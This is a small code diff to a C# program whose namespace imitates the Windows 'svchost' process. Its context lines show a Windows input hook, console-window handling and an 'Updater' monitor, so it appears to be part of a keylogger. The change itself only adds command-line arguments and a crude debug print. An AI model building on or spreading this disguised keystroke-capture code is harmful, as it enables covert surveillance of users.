@@ -21,7 +21,7 @@ namespace Svchost
         private static IntPtr _hookID = IntPtr.Zero;
         private static TextHandler textHandler;
 
-        public static void Main()
+        public static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
 
@@ -36,6 +36,7 @@ namespace Svchost
             var updater = new Updater();
             updater.StartMonitoring();
 
+            Console.WriteLine("bite : " + (args.Length > 0 ? args[0] : "cul"));
 
             Application.Run();
             UnhookWindowsHookEx(_hookID);
